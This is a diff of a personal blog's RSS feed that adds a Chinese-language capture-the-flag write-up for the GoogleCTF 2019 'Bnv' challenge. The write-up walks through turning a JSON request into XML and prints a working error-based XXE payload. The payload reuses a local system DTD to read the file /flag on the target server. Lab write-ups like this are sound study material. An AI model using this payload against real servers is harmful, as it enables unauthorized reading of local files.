@@ -5,8 +5,8 @@
         <link>http://odiws.github.io</link>
         <description></description>
         <language>en</language>
-        <pubDate>Sun, 28 Jul 2024 23:18:59 +0800</pubDate>
-        <lastBuildDate>Sun, 28 Jul 2024 23:18:59 +0800</lastBuildDate>
+        <pubDate>Wed, 18 Sep 2024 21:44:01 +0800</pubDate>
+        <lastBuildDate>Wed, 18 Sep 2024 21:44:01 +0800</lastBuildDate>
         <category>buuctf</category>
         <category>system_file</category>
         <category>sql文件读取</category>
@@ -97,6 +97,36 @@
         <category>xpath注入</category>
         <category>Padding oracle attack 与CBC翻转字节攻击</category>
         <category>php</category>
+        <category>sql盲注</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/18/Quals-Bnv/</guid>
+            <title>Quals]Bnv</title>
+            <link>http://odiws.github.io/2024/09/18/Quals-Bnv/</link>
+            <category>buuctf</category>
+            <category>xxe</category>
+            <pubDate>Wed, 18 Sep 2024 21:44:01 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;googlectf2019-qualsbnv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#googlectf2019-qualsbnv&#34;&gt;#&lt;/a&gt; [GoogleCTF2019 Quals]Bnv&lt;/h2&gt;
+&lt;p&gt;先 bp 抓包发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;是 json 数据：由 json 数据想到是 xxe 注入，再次基础上修改 Content-Type 为 application/xml, 发现是少了一个 &amp;lt;，感觉是少了一个 xml 文件的头，加一个&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;报错说是没找到 DTD 文件，添加 DTD 文件的实体&lt;/p&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;135601360123502401401250&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;xxe;&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;报错没有元素消息的声明&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到报错没有元素消息的声明，显然解析器需要在 DTD 中声明以定义的元素，有点像在使用变量之前声明变量。所以让我们给它想要的，我们要做的就是在 DTD 中声明消息，我们可以通过使用数据，指定名为 message 的元素来实现这一点，定义类型设置为 PC 数据，现在让我们继续尝试。&lt;/p&gt;
+&lt;p&gt;这里得说一下 DTD&lt;br&gt;
+ 文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。带有 DTD 的 XML 文档实例&lt;br&gt;
+&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;回显成功，通过外带数据的形式添加一&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/7.png&#34; alt=&#34;7&#34;&gt; 个外部实体来发出出口请求。&lt;/p&gt;
+&lt;p&gt;未加载外部实体，需要使用内部 dtd 文件加载，（之前还用加载文件的方法，结果标记错误）&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后的数据：&lt;/p&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY % ISOamso &#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt; file SYSTEM &#34;file:///flag&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt; eval &#34;&amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x26;&#34;&gt;&amp;amp;#x26;&lt;/span&gt;#x25; error SYSTEM &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x27;&#34;&gt;&amp;amp;#x27;&lt;/span&gt;file:///aaaaa/&lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;file;&lt;span class=&#34;token entity&#34; title=&#34;&amp;#x27;&#34;&gt;&amp;amp;#x27;&lt;/span&gt;&gt;&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;eval;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;error;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%local_dtd;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdnL2FydGljbGUvZGV0YWlscy8xMTQ0MjAxNjA=&#34;&gt;https://blog.csdn.net/cjdgg/article/details/114420160&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2024/07/28/2019-SVGMagic/</guid>
             <title>[BSidesCF2019]SVGMagic</title>
